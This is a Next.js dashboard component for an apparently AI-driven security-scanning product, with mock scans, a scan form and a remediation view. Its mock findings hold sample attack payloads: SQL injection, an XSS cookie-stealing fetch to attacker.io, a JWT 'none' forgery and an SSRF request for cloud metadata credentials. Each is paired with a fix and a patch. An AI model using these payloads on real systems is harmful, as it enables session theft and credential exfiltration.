'use client';
import { useState, useEffect, useRef, useCallback } from 'react';
import Link from 'next/link';
import styles from './dashboard.module.css';

const MOCK_SCANS = [
  {
    id: 'scan-001',
    target: 'https://api.enterprise-gateway.io',
    targetType: 'Live Web Application',
    status: 'complete',
    date: '2026-09-28',
    duration: '4m 12s',
    critical: 2,
    high: 5,
    medium: 3,
    low: 7,
    score: 42,
  },
  {
    id: 'scan-002',
    target: 'https://github.com/acme-corp/billing-service',
    targetType: 'Remote Git Repository',
    status: 'complete',
    date: '2026-09-27',
    duration: '6m 38s',
    critical: 0,
    high: 2,
    medium: 8,
    low: 4,
    score: 71,
  },
  {
    id: 'scan-003',
    target: 'https://staging.enterprise-auth.io',
    targetType: 'White-Box Correlated',
    status: 'complete',
    date: '2026-09-25',
    duration: '3m 55s',
    critical: 1,
    high: 3,
    medium: 2,
    low: 1,
    score: 55,
  },
];

const MOCK_VULNS = [
  {
    id: 'v1',
    title: 'Broken Object Level Authorization (BOLA) & SQL Injection in /api/v2/orders',
    severity: 'critical',
    cvss: 9.8,
    type: 'Access Control & Injection (CWE-89 / CWE-639)',
    endpoint: 'GET /api/v2/orders/:id?includeDetails=true',
    status: 'open',
    poc: "curl -X GET 'https://api.enterprise-gateway.io/api/v2/orders/1042?includeDetails=1%27%20OR%201=1--' -H 'Authorization: Bearer <unprivileged_token>'",
    description: 'The endpoint does not validate whether the authenticated user owns order resource ID 1042. Furthermore, query parameters are concatenated directly into a database execution buffer without parameterization, permitting arbitrary database exfiltration.',
    fix: '1. Implement strict tenant claim validation against session context.\n2. Utilize parameterized ORM / query builders.\n3. Add centralized object-level authorization middleware.\n4. Enable rate-limiting and audit logging.',
    patch: `--- a/src/controllers/orderController.ts\n+++ b/src/controllers/orderController.ts\n@@ -18,6 +18,12 @@\n export async function getOrderDetails(req: AuthenticatedRequest, res: Response) {\n   const { id } = req.params;\n+  const sessionUserId = req.user.id;\n+\n+  // Verify tenant ownership\n+  const isOwner = await verifyOrderOwnership(sessionUserId, id);\n+  if (!isOwner) return res.status(403).json({ error: 'Access denied to order resource' });\n+\n-  const order = await db.raw("SELECT * FROM orders WHERE id = '" + id + "'");\n+  const order = await db('orders').where({ id, user_id: sessionUserId }).first();\n   return res.json(order);\n }`
  },
  {
    id: 'v2',
    title: 'Stored Cross-Site Scripting (XSS) in Tenant Notification Profile',
    severity: 'critical',
    cvss: 9.1,
    type: 'Cross-Site Scripting (CWE-79)',
    endpoint: 'POST /api/v2/tenants/settings/notifications',
    status: 'open',
    poc: '{"notificationTemplate": "<img src=x onerror=\\"fetch(\'https://attacker.io/steal?\'+document.cookie)\\">"}',
    description: 'User-controlled notification payloads are stored without sanitization and rendered in unescaped HTML email and portal templates, allowing arbitrary script execution within admin sessions.',
    fix: '1. Pass inputs through DOMPurify / server-side HTML sanitizer.\n2. Apply strict Content-Security-Policy (CSP).\n3. Use parameterized string templates.',
    patch: `--- a/src/services/notificationService.ts\n+++ b/src/services/notificationService.ts\n@@ -8,3 +8,4 @@\n+import DOMPurify from 'isomorphic-dompurify';\n export function formatNotification(template: string) {\n-  return \`<div>\${template}</div>\`;\n+  const clean = DOMPurify.sanitize(template);\n+  return \`<div>\${clean}</div>\`;\n }`
  },
  {
    id: 'v3',
    title: 'JWT Algorithm Confusion and Missing Signature Verification',
    severity: 'high',
    cvss: 8.4,
    type: 'Authentication & Cryptography (CWE-347)',
    endpoint: 'POST /api/v2/auth/verify-token',
    status: 'open',
    poc: 'Header: {"alg":"none","typ":"JWT"}\nPayload: {"sub":"admin@enterprise.com","role":"superadmin"}',
    description: 'The authentication filter accepts insecure algorithm headers ("none" and symmetric HMAC keys where RSA asymmetric public keys are expected), allowing unauthenticated signature forgery.',
    fix: '1. Enforce strict RS256/Ed25519 asymmetric algorithm verification.\n2. Reject tokens specifying "none" or algorithm mismatches.\n3. Verify token expiration and issuer audience claims.',
    patch: `--- a/src/middleware/authMiddleware.ts\n+++ b/src/middleware/authMiddleware.ts\n@@ -14,4 +14,5 @@\n export function verifyAuth(token: string) {\n-  return jwt.decode(token);\n+  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {\n+    algorithms: ['RS256'],\n+    issuer: 'enterprise-auth'\n+  });\n }`
  },
  {
    id: 'v4',
    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
    severity: 'high',
    cvss: 7.8,
    type: 'Server-Side Request Forgery (CWE-918)',
    endpoint: 'POST /api/v2/integrations/webhooks/test',
    status: 'open',
    poc: '{"targetUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    description: 'The webhook tester accepts internal IP ranges and cloud metadata IP addresses (169.254.169.254, localhost, private RFC-1918 subnets), allowing exfiltration of cloud credentials.',
    fix: '1. Validate URL against an allowed scheme (HTTPS only).\n2. Resolve DNS and block private IP address ranges (0.0.0.0/8, 10.0.0.0/8, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16).\n3. Execute outbound webhooks via an egress proxy.',
    patch: `--- a/src/services/webhookDispatcher.ts\n+++ b/src/services/webhookDispatcher.ts\n@@ -22,3 +22,4 @@\n export async function dispatchWebhook(url: string) {\n+  await assertPublicEgressUrl(url);\n   return axios.post(url, payload, { timeout: 4000 });\n }`
  },
  {
    id: 'v5',
    title: 'Missing Rate Limiting on Password Reset Endpoint',
    severity: 'medium',
    cvss: 6.2,
    type: 'Rate Limiting & Abuse (CWE-307)',
    endpoint: 'POST /api/v2/auth/request-reset',
    status: 'open',
    poc: 'Automated flood test of 500 requests within 10 seconds returned 200 OK without throttling.',
    description: 'The endpoint lacks client IP and email identity rate limits, permitting denial of service and enumeration attacks.',
    fix: '1. Implement Redis-backed sliding window rate limiter.\n2. Cap requests at 5 attempts per 15-minute window per IP/Email.\n3. Return consistent generic response to prevent account enumeration.',
    patch: `--- a/src/routes/authRoutes.ts\n+++ b/src/routes/authRoutes.ts\n@@ -10,3 +10,4 @@\n+import { rateLimit } from '../middleware/rateLimiter';\n-router.post('/request-reset', handleReset);\n+router.post('/request-reset', rateLimit({ max: 5, windowMs: 15 * 60 * 1000 }), handleReset);`
  },
];

type ScanStatus = 'idle' | 'running' | 'complete' | 'error';

interface ScanProgress {
  status: ScanStatus;
  phase: string;
  progress: number;
  messages: string[];
  findings: number;
  tokens: number;
}

export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState<'overview' | 'new-scan' | 'history' | 'findings'>('overview');
  const [scanType, setScanType] = useState<'live-url' | 'github-repo' | 'local-dir' | 'whitebox' | 'target-list'>('live-url');
  
  // Target inputs
  const [targetUrl, setTargetUrl] = useState('');
  const [targetRepo, setTargetRepo] = useState('');
  const [targetDir, setTargetDir] = useState('./my-app');
  const [whiteboxRepo, setWhiteboxRepo] = useState('https://github.com/org/repo');
  const [whiteboxUrl, setWhiteboxUrl] = useState('https://your-app.com');
  const [targetListContent, setTargetListContent] = useState('');
  
  // Model & scan options
  const [aiModel, setAiModel] = useState('anthropic/claude-sonnet-4-6');
  const [scanMode, setScanMode] = useState<'quick' | 'standard' | 'deep'>('quick');
  const [instructions, setInstructions] = useState('');

  const [scanProgress, setScanProgress] = useState<ScanProgress>({
    status: 'idle', phase: '', progress: 0, messages: [], findings: 0, tokens: 0,
  });
  const [selectedScan, setSelectedScan] = useState(MOCK_SCANS[0]);
  const [selectedVuln, setSelectedVuln] = useState<typeof MOCK_VULNS[0]>(MOCK_VULNS[0]);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [copyToast, setCopyToast] = useState<string | null>(null);
  const logRef = useRef<HTMLDivElement>(null);

  const [activeRunId, setActiveRunId] = useState<string | null>(null);
  const pollRef = useRef<NodeJS.Timeout | null>(null);

  const showToast = (msg: string) => {
    setCopyToast(msg);
    setTimeout(() => setCopyToast(null), 3000);
  };

  const downloadFile = (filename: string, content: string, mimeType: string) => {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`Downloaded ${filename}`);
  };

  const pollScan = useCallback(async (runId: string) => {
    try {
      const res = await fetch(`/api/scan/${runId}`);
      const data = await res.json();

      setScanProgress(prev => ({
        ...prev,
        status: data.status,
        phase: data.logs?.[data.logs.length - 1]?.split('] ').pop() || prev.phase,
        progress: data.progress,
        messages: data.logs || prev.messages,
        findings: data.findings?.length || 0,
        tokens: data.tokenInfo?.total_tokens || prev.tokens,
      }));

      if (data.status === 'complete') {
        if (pollRef.current) clearInterval(pollRef.current);
        if (data.findings?.length) {
          setActiveTab('findings');
        }
      }
    } catch (e) {
      console.error('Poll error', e);
    }
  }, []);

  const getActiveTargets = (): { targets: string[]; targetType: string } => {
    if (scanType === 'live-url') return { targets: [targetUrl.trim()], targetType: 'url' };
    if (scanType === 'github-repo') return { targets: [targetRepo.trim()], targetType: 'repo' };
    if (scanType === 'local-dir') return { targets: [targetDir.trim()], targetType: 'dir' };
    if (scanType === 'whitebox') return { targets: [whiteboxRepo.trim(), whiteboxUrl.trim()].filter(Boolean), targetType: 'whitebox' };
    if (scanType === 'target-list') {
      const lines = targetListContent.split('\n').map(l => l.trim()).filter(l => Boolean(l && !l.startsWith('#')));
      return { targets: lines, targetType: 'list' };
    }
    return { targets: [], targetType: 'url' };
  };

  const startScan = async () => {
    const { targets, targetType } = getActiveTargets();
    if (targets.length === 0 || scanProgress.status === 'running') return;

    setScanProgress({
      status: 'running',
      phase: 'Initializing autonomous AI agents...',
      progress: 5,
      messages: [
        `[CONFIG] Target Architecture: ${targetType.toUpperCase()}`,
        `[CONFIG] Selected Scope: ${targets.join(', ')}`,
        `[AI-ENGINE] Reasoning Models: Anthropic Claude & OpenAI Frontier`,
        `[AGENT] Initializing sandbox & surface discovery orchestrator...`,
      ],
      findings: 0,
      tokens: 0,
    });
    setActiveTab('overview');

    try {
      const res = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targets,
          targetType,
          mode: scanMode,
          llm: aiModel,
          instructions: instructions || undefined,
        }),
      });
      const data = await res.json();

      if (data.error) {
        setScanProgress(prev => ({ ...prev, status: 'error', phase: `Error: ${data.error}` }));
        return;
      }

      setActiveRunId(data.runId);
      pollRef.current = setInterval(() => pollScan(data.runId), 5000);
    } catch (e: any) {
      setScanProgress(prev => ({ ...prev, status: 'error', phase: `Failed: ${e.message}` }));
    }
  };

  const scoreColor = (score: number) => {
    if (score < 40) return 'var(--red-bright)';
    if (score < 70) return 'var(--orange)';
    return 'var(--green)';
  };

  const severityBadge = (s: string) => {
    if (s === 'critical') return 'badge-red';
    if (s === 'high') return 'badge-orange';
    if (s === 'medium') return 'badge-yellow';
    return 'badge-gray';
  };

  return (
    <div className={styles.layout}>
      {copyToast && <div className={styles.toast}>{copyToast}</div>}

      {/* Sidebar */}
      <aside className={`${styles.sidebar} ${sidebarCollapsed ? styles.sidebarCollapsed : ''}`}>
        <div className={styles.sidebarHeader}>
          <Link href="/" className={styles.logo}>
            <div className={styles.logoBadge}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 2L2 7l10 5 10-5-10-5z" />
                <path d="M2 17l10 5 10-5" />
                <path d="M2 12l10 5 10-5" />
              </svg>
            </div>
            {!sidebarCollapsed && <span className={styles.logoText}>RedSuture</span>}
          </Link>
          <button className={styles.collapseBtn} onClick={() => setSidebarCollapsed(!sidebarCollapsed)} aria-label="Toggle Sidebar">
            {sidebarCollapsed ? '→' : '←'}
          </button>
        </div>

        <nav className={styles.sidebarNav}>
          {[
            { id: 'overview', label: 'Overview' },
            { id: 'new-scan', label: 'New Security Scan' },
            { id: 'findings', label: 'Findings & Remediation' },
            { id: 'history', label: 'Audit History' },
          ].map(item => (
            <button
              key={item.id}
              className={`${styles.navItem} ${activeTab === item.id ? styles.navItemActive : ''}`}
              onClick={() => setActiveTab(item.id as typeof activeTab)}
            >
              {!sidebarCollapsed && <span>{item.label}</span>}
            </button>
          ))}
        </nav>

        <div className={styles.sidebarFooter}>
          {scanProgress.status === 'running' && (
            <div className={styles.scanStatus}>
              <div className={styles.scanStatusDot} />
              {!sidebarCollapsed && (
                <div className={styles.scanStatusText}>
                  <span>Autonomous Scan Running</span>
                  <span>{scanProgress.progress}%</span>
                </div>
              )}
            </div>
          )}
          <div className={styles.userCard}>
            <div className={styles.userAvatar}>DM</div>
            {!sidebarCollapsed && (
              <div className={styles.userInfo}>
                <span className={styles.userName}>Enterprise Account</span>
                <span className={styles.userPlan}>Managed Tier</span>
              </div>
            )}
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <main className={styles.main}>
        {/* Top Bar */}
        <header className={styles.topBar}>
          <div className={styles.topBarLeft}>
            <h1 className={styles.pageTitle}>
              {activeTab === 'overview' && 'Security Posture Overview'}
              {activeTab === 'new-scan' && 'Configure Managed Assessment'}
              {activeTab === 'findings' && 'Validated Vulnerabilities & Remediation'}
              {activeTab === 'history' && 'Audit History & Compliance Archives'}
            </h1>
          </div>
          <div className={styles.topBarRight}>
            <div className={styles.aiBadge}>
              <span className={styles.pulseGreen} />
              <span>AI Engine: Claude 3.7 &amp; OpenAI</span>
            </div>
            <button className="btn-primary" onClick={() => setActiveTab('new-scan')} style={{ padding: '8px 16px', fontSize: '0.85rem' }}>
              + Launch Scan
            </button>
          </div>
        </header>

        <div className={styles.content}>

          {/* OVERVIEW TAB */}
          {activeTab === 'overview' && (
            <div className={styles.overview}>
              {/* Stats */}
              <div className={styles.statsGrid}>
                {[
                  { label: 'Completed Assessments', value: '7', color: 'var(--text-primary)' },
                  { label: 'Validated Critical Risks', value: '3', color: 'var(--red-bright)' },
                  { label: 'High Severity Findings', value: '10', color: 'var(--orange)' },
                  { label: 'Remediation Guides Generated', value: '12', color: 'var(--green)' },
                ].map((s, i) => (
                  <div key={i} className={styles.statCard}>
                    <div className={styles.statValue} style={{ color: s.color }}>{s.value}</div>
                    <div className={styles.statLabel}>{s.label}</div>
                  </div>
                ))}
              </div>

              {/* Active scan log */}
              {scanProgress.status !== 'idle' && (
                <div className={styles.liveCard}>
                  <div className={styles.liveCardHeader}>
                    <div className={styles.liveIndicator}>
                      {scanProgress.status === 'running' && (
                        <>
                          <div className={styles.liveDot} />
                          <span>Autonomous Agents Active</span>
                        </>
                      )}
                      {scanProgress.status === 'complete' && (
                        <>
                          <span style={{ color: 'var(--green)' }}>✓</span>
                          <span style={{ color: 'var(--green)' }}>Assessment Complete</span>
                        </>
                      )}
                    </div>
                    <span className={styles.livePhase}>{scanProgress.phase}</span>
                    <span className={styles.liveProgress}>{scanProgress.progress}%</span>
                  </div>
                  <div className={styles.progressBar}>
                    <div className={styles.progressFill} style={{ width: `${scanProgress.progress}%` }} />
                  </div>
                  <div className={styles.scanLog} ref={logRef}>
                    {scanProgress.messages.map((msg, i) => (
                      <div key={i} className={styles.logLine}>
                        <span className={styles.logTime}>{msg.split(']')[0]}]</span>
                        <span className={`${styles.logMsg} ${msg.includes('AGENT') || msg.includes('AI') ? styles.logAgent : msg.includes('complete') ? styles.logSuccess : ''}`}>
                          {msg.split(']')[1]}
                        </span>
                      </div>
                    ))}
                  </div>
                  <div className={styles.scanMeta}>
                    <span>Findings: {scanProgress.findings} validated</span>
                    <span>AI Reasoning Tokens: {(scanProgress.tokens / 1000).toFixed(0)}K</span>
                    <span>Zero False-Positive Attestation</span>
                  </div>
                </div>
              )}

              {/* Recent scans */}
              <div className={styles.section}>
                <div className={styles.sectionHeader}>
                  <h2 className={styles.sectionTitle}>Recent Assessments</h2>
                  <button className="btn-ghost" onClick={() => setActiveTab('history')} style={{ fontSize: '0.8rem' }}>View all history →</button>
                </div>
                <div className={styles.scanList}>
                  {MOCK_SCANS.map(scan => (
                    <div key={scan.id} className={styles.scanRow} onClick={() => { setSelectedScan(scan); setActiveTab('findings'); }}>
                      <div className={styles.scanTarget}>
                        <div className={styles.targetTypeBadgeMini}>{scan.targetType}</div>
                        <div>
                          <div className={styles.scanTargetUrl}>{scan.target}</div>
                          <div className={styles.scanDate}>{scan.date} · Execution: {scan.duration}</div>
                        </div>
                      </div>
                      <div className={styles.scanBadges}>
                        {scan.critical > 0 && <span className="badge badge-red">{scan.critical} Critical</span>}
                        {scan.high > 0 && <span className="badge badge-orange">{scan.high} High</span>}
                        {scan.medium > 0 && <span className="badge badge-yellow">{scan.medium} Medium</span>}
                      </div>
                      <div className={styles.scanScore} style={{ color: scoreColor(scan.score) }}>
                        {scan.score}/100
                      </div>
                      <button className="btn-ghost" style={{ fontSize: '0.8rem' }}>Review Guides →</button>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* NEW SCAN TAB */}
          {activeTab === 'new-scan' && (
            <div className={styles.newScan}>
              <div className={styles.scanForm}>
                <div className={styles.targetTypeHeader}>
                  <h2 className={styles.formSectionTitle}>Select Target Architecture</h2>
                  <p className={styles.formSectionDesc}>
                    Specify which asset types you want our autonomous AI red team to assess on your behalf.
                  </p>
                </div>

                {/* ELEGANT BALANCED TARGET ARCHITECTURE GRID */}
                <div className={styles.targetGrid}>
                  {[
                    {
                      id: 'live-url',
                      label: 'Live Web Application',
                      badge: 'Black-box DAST',
                      desc: 'Scan production or staging URLs, single-page apps (React/Next.js), and public API gateways.',
                    },
                    {
                      id: 'github-repo',
                      label: 'Remote Git Repository',
                      badge: 'Source SAST + Logic',
                      desc: 'Codebase analysis across GitHub, GitLab, or Bitbucket for logic bugs, secrets, and taint flaws.',
                    },
                    {
                      id: 'local-dir',
                      label: 'Local Codebase Directory',
                      badge: 'Internal QA Workspace',
                      desc: 'Direct analysis of local application folders and microservice packages before deployment.',
                    },
                    {
                      id: 'whitebox',
                      label: 'White-Box Correlated Multi-Target',
                      badge: 'Hybrid Correlation',
                      desc: 'Correlate running live endpoints with source code logic for deepest exploit validation.',
                    },
                    {
                      id: 'target-list',
                      label: 'Bulk Scope Target List',
                      badge: 'Enterprise Estate List',
                      desc: 'Batch assessment across multiple microservices, endpoints, and hosts from a target file.',
                    },
                  ].map(t => (
                    <button
                      key={t.id}
                      type="button"
                      className={`${styles.targetCard} ${scanType === t.id ? styles.targetCardActive : ''}`}
                      onClick={() => setScanType(t.id as typeof scanType)}
                    >
                      <div className={styles.targetCardHeader}>
                        <span className={styles.targetCardLabel}>{t.label}</span>
                        <span className={styles.targetCardBadge}>{t.badge}</span>
                      </div>
                      <span className={styles.targetCardDesc}>{t.desc}</span>
                    </button>
                  ))}
                </div>

                {/* DYNAMIC INPUTS BASED ON SELECTED TARGET TYPE */}
                <div className={styles.targetInputContainer}>
                  {scanType === 'live-url' && (
                    <div className={styles.targetInputGroup}>
                      <label className={styles.inputLabel}>
                        Target Application URL
                        <span className={styles.inputHint}>HTTPS address of the live web app or API</span>
                      </label>
                      <input
                        type="url"
                        className={styles.targetField}
                        placeholder="https://app.enterprise-demo.io"
                        value={targetUrl}
                        onChange={e => setTargetUrl(e.target.value)}
                      />
                    </div>
                  )}

                  {scanType === 'github-repo' && (
                    <div className={styles.targetInputGroup}>
                      <label className={styles.inputLabel}>
                        Remote Repository URL
                        <span className={styles.inputHint}>GitHub, GitLab, or Bitbucket HTTPS link</span>
                      </label>
                      <input
                        type="url"
                        className={styles.targetField}
                        placeholder="https://github.com/acme-corp/payment-service"
                        value={targetRepo}
                        onChange={e => setTargetRepo(e.target.value)}
                      />
                    </div>
                  )}

                  {scanType === 'local-dir' && (
                    <div className={styles.targetInputGroup}>
                      <label className={styles.inputLabel}>
                        Local Workspace Path
                        <span className={styles.inputHint}>Relative or absolute directory path to scan</span>
                      </label>
                      <input
                        type="text"
                        className={styles.targetField}
                        placeholder="./packages/api-server"
                        value={targetDir}
                        onChange={e => setTargetDir(e.target.value)}
                      />
                    </div>
                  )}

                  {scanType === 'whitebox' && (
                    <div className={styles.whiteboxGrid}>
                      <div className={styles.targetInputGroup}>
                        <label className={styles.inputLabel}>
                          1. Source Repository
                          <span className={styles.inputHint}>Codebase for taint &amp; logic analysis</span>
                        </label>
                        <input
                          type="url"
                          className={styles.targetField}
                          placeholder="https://github.com/acme/auth-api"
                          value={whiteboxRepo}
                          onChange={e => setWhiteboxRepo(e.target.value)}
                        />
                      </div>
                      <div className={styles.targetInputGroup}>
                        <label className={styles.inputLabel}>
                          2. Live Target URL
                          <span className={styles.inputHint}>Live running application to execute PoC</span>
                        </label>
                        <input
                          type="url"
                          className={styles.targetField}
                          placeholder="https://staging.acme.com"
                          value={whiteboxUrl}
                          onChange={e => setWhiteboxUrl(e.target.value)}
                        />
                      </div>
                    </div>
                  )}

                  {scanType === 'target-list' && (
                    <div className={styles.targetInputGroup}>
                      <label className={styles.inputLabel}>
                        Target Scope Entries
                        <span className={styles.inputHint}>One target per non-empty line (URLs, repos, or hosts)</span>
                      </label>
                      <textarea
                        className={styles.targetListArea}
                        rows={6}
                        placeholder={`https://api.acme.com\nhttps://auth.acme.com\nhttps://github.com/acme/billing\nhttps://qa-cluster.acme.internal`}
                        value={targetListContent}
                        onChange={e => setTargetListContent(e.target.value)}
                      />
                    </div>
                  )}
                </div>

                <div className={styles.optionsGrid}>
                  <div className={styles.optionCard}>
                    <div className={styles.optionHeader}>
                      <span className={styles.optionLabel}>AI Reasoning Architecture</span>
                      <span className={styles.modeBadge}>FRONTIER ENSEMBLE</span>
                    </div>
                    <div className={styles.radioGroup}>
                      {[
                        { value: 'anthropic/claude-sonnet-4-6', label: 'Anthropic Claude Sonnet & Opus', desc: 'Deepest logic comprehension & code diff synthesis' },
                        { value: 'openai/gpt-4o', label: 'OpenAI Frontier Models', desc: 'Rapid exploratory payload formulation & dynamic fuzzing' },
                        { value: 'ensemble', label: 'Hybrid Model Ensemble (Recommended)', desc: 'Combines Claude code tracing with OpenAI adversarial hypotheses' },
                      ].map(m => (
                        <label key={m.value} className={styles.radioLabel}>
                          <input
                            type="radio"
                            name="aiModel"
                            checked={aiModel === m.value}
                            onChange={() => setAiModel(m.value)}
                            className={styles.radio}
                          />
                          <div className={styles.radioContent}>
                            <span className={styles.radioTitle}>{m.label}</span>
                            <span className={styles.radioDesc}>{m.desc}</span>
                          </div>
                        </label>
                      ))}
                    </div>
                  </div>

                  <div className={styles.optionCard}>
                    <div className={styles.optionHeader}>
                      <span className={styles.optionLabel}>Scan Depth Mode</span>
                      <span className={styles.modeBadge}>{scanMode.toUpperCase()}</span>
                    </div>
                    <div className={styles.radioGroup}>
                      {[
                        { value: 'quick', label: 'Quick Scan', desc: 'Standard OWASP surface & rapid parameter testing (~5m)' },
                        { value: 'standard', label: 'Standard Pentest', desc: 'Full authentication, injection & API mapping (~15m)' },
                        { value: 'deep', label: 'Deep Autonomous Audit', desc: 'Complex multi-step exploit chains & whitebox correlation (~45m)' },
                      ].map(opt => (
                        <label key={opt.value} className={styles.radioLabel}>
                          <input
                            type="radio"
                            name="mode"
                            checked={scanMode === opt.value}
                            onChange={() => setScanMode(opt.value as typeof scanMode)}
                            className={styles.radio}
                          />
                          <div className={styles.radioContent}>
                            <span className={styles.radioTitle}>{opt.label}</span>
                            <span className={styles.radioDesc}>{opt.desc}</span>
                          </div>
                        </label>
                      ))}
                    </div>
                  </div>
                </div>

                <div className={styles.optionCard} style={{ width: '100%' }}>
                  <div className={styles.optionHeader}>
                    <span className={styles.optionLabel}>Custom Engagement Instructions (Optional)</span>
                    <span className={styles.inputHint}>Specify scope boundaries or authentication parameters</span>
                  </div>
                  <textarea
                    className={styles.instructionField}
                    placeholder={'Focus on authorization flows on /api/v2 and token privilege escalation.\nExclude /admin/delete-database testing.'}
                    value={instructions}
                    onChange={e => setInstructions(e.target.value)}
                    rows={3}
                  />
                </div>

                <div className={styles.scanActions}>
                  <div className={styles.costEstimate}>
                    <span>Target Scope:</span>
                    <span className={styles.costAmount}>{scanType.toUpperCase()}</span>
                    <span className={styles.costNote}>— Generates downloadable step-by-step guides &amp; patches</span>
                  </div>
                  <button
                    className="btn-primary"
                    onClick={startScan}
                    disabled={scanProgress.status === 'running'}
                    style={{ padding: '14px 32px', fontSize: '0.95rem' }}
                  >
                    {scanProgress.status === 'running' ? 'Assessment In Progress...' : 'Launch Managed Assessment'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* FINDINGS TAB */}
          {activeTab === 'findings' && (
            <div className={styles.findings}>
              <div className={styles.findingsHeader}>
                <div className={styles.findingsMeta}>
                  <span className={styles.findingsTarget}>{selectedScan.target}</span>
                  <span className={styles.findingsDate}>{selectedScan.date} · Managed AI Assessment</span>
                </div>
                <div className={styles.findingsBadges}>
                  <span className="badge badge-red">{selectedScan.critical} Critical</span>
                  <span className="badge badge-orange">{selectedScan.high} High</span>
                  <span className="badge badge-yellow">{selectedScan.medium} Medium</span>
                  <span className="badge badge-gray">{selectedScan.low} Low</span>
                </div>
                <div className={styles.securityScore}>
                  <span>Security Score</span>
                  <span className={styles.scoreValue} style={{ color: scoreColor(selectedScan.score) }}>
                    {selectedScan.score}/100
                  </span>
                </div>
              </div>

              <div className={styles.findingsLayout}>
                <div className={styles.vulnList}>
                  {MOCK_VULNS.map(v => (
                    <div
                      key={v.id}
                      className={`${styles.vulnCard} ${selectedVuln?.id === v.id ? styles.vulnCardSelected : ''}`}
                      onClick={() => setSelectedVuln(v)}
                    >
                      <div className={`badge ${severityBadge(v.severity)}`} style={{ fontSize: '0.7rem' }}>
                        {v.severity.toUpperCase()}
                      </div>
                      <div className={styles.vulnTitle}>{v.title}</div>
                      <div className={styles.vulnMeta}>
                        <span className={styles.vulnEndpoint}>{v.endpoint}</span>
                        <span className={styles.cvssScore}>CVSS {v.cvss}</span>
                      </div>
                    </div>
                  ))}
                </div>

                {selectedVuln ? (
                  <div className={styles.vulnDetail}>
                    <div className={styles.vulnDetailHeader}>
                      <div className="badge badge-red" style={{ fontSize: '0.75rem' }}>
                        {selectedVuln.severity.toUpperCase()} · CVSS {selectedVuln.cvss}
                      </div>
                      <h2 className={styles.vulnDetailTitle}>{selectedVuln.title}</h2>
                      <div className={styles.vulnDetailMeta}>
                        <span>Vulnerability Category: {selectedVuln.type}</span>
                        <span>Target Handler / Endpoint: <code className={styles.code}>{selectedVuln.endpoint}</code></span>
                      </div>
                    </div>

                    {/* DOWNLOADABLE REMEDIATION PACKAGE BAR */}
                    <div className={styles.downloadPackageBar}>
                      <div className={styles.downloadBarTitle}>
                        <strong>Downloadable Remediation Package</strong>
                        <span>Export verified fixes in your preferred format</span>
                      </div>
                      <div className={styles.downloadButtonsGroup}>
                        <button
                          className={styles.downloadBtn}
                          onClick={() => downloadFile(`${selectedVuln.id}-code-fix.patch`, selectedVuln.patch, 'text/plain')}
                        >
                          📥 Code Patch (.patch)
                        </button>
                        <button
                          className={styles.downloadBtn}
                          onClick={() => downloadFile(
                            `${selectedVuln.id}-remediation-guide.md`,
                            `# Remediation Guide: ${selectedVuln.title}\n\n## Vulnerability Details\n- Severity: ${selectedVuln.severity.toUpperCase()} (CVSS ${selectedVuln.cvss})\n- Type: ${selectedVuln.type}\n- Endpoint: ${selectedVuln.endpoint}\n\n## Description\n${selectedVuln.description}\n\n## Verified Proof of Concept\n\`\`\`\n${selectedVuln.poc}\n\`\`\`\n\n## Step-by-Step Fix Procedure\n${selectedVuln.fix}\n\n## Surgical Code Patch\n\`\`\`diff\n${selectedVuln.patch}\n\`\`\`\n`,
                            'text/markdown'
                          )}
                        >
                          📄 Developer Guide (.md)
                        </button>
                        <button
                          className={styles.downloadBtn}
                          onClick={() => downloadFile(
                            `redsuture-${selectedVuln.id}.sarif`,
                            JSON.stringify({
                              version: '2.1.0',
                              $schema: 'http://json.schemastore.org/sarif-2.1.0',
                              runs: [{
                                tool: { driver: { name: 'RedSuture Autonomous AI', version: '2.0.0' } },
                                results: [{
                                  ruleId: selectedVuln.id,
                                  message: { text: selectedVuln.title },
                                  properties: { cvss: selectedVuln.cvss, severity: selectedVuln.severity, remediation: selectedVuln.fix }
                                }]
                              }]
                            }, null, 2),
                            'application/json'
                          )}
                        >
                          🛡️ SARIF v2.1.0 (.sarif)
                        </button>
                        <button
                          className={styles.downloadBtn}
                          onClick={() => downloadFile(
                            `audit-report-${selectedVuln.id}.json`,
                            JSON.stringify(selectedVuln, null, 2),
                            'application/json'
                          )}
                        >
                          📊 Audit Report (.json)
                        </button>
                      </div>
                    </div>

                    <div className={styles.vulnSection}>
                      <h3 className={styles.vulnSectionTitle}>Verified Proof-of-Concept Exploit</h3>
                      <div className={styles.pocBox}>
                        <code>{selectedVuln.poc}</code>
                      </div>
                    </div>

                    <div className={styles.vulnSection}>
                      <h3 className={styles.vulnSectionTitle}>Technical Impact &amp; Root Cause Analysis</h3>
                      <p className={styles.vulnDesc}>{selectedVuln.description}</p>
                    </div>

                    <div className={styles.vulnSection}>
                      <h3 className={styles.vulnSectionTitle}>Step-by-Step Implementation Guide</h3>
                      <div className={styles.stepFixBox}>
                        {selectedVuln.fix.split('\n').map((step, idx) => (
                          <div key={idx} className={styles.stepFixItem}>
                            <span>{step}</span>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div className={styles.vulnSection}>
                      <h3 className={styles.vulnSectionTitle}>SutureEngine Surgical Code Patch</h3>
                      <div className={styles.patchDiffBox}>
                        <pre className={styles.patchPre}>{selectedVuln.patch}</pre>
                      </div>
                    </div>

                    <div className={styles.vulnActions}>
                      <button
                        className="btn-primary"
                        onClick={() => {
                          navigator.clipboard?.writeText(selectedVuln.patch);
                          showToast('Code patch copied to clipboard!');
                        }}
                        style={{ fontSize: '0.875rem' }}
                      >
                        Copy Code Patch
                      </button>
                      <button
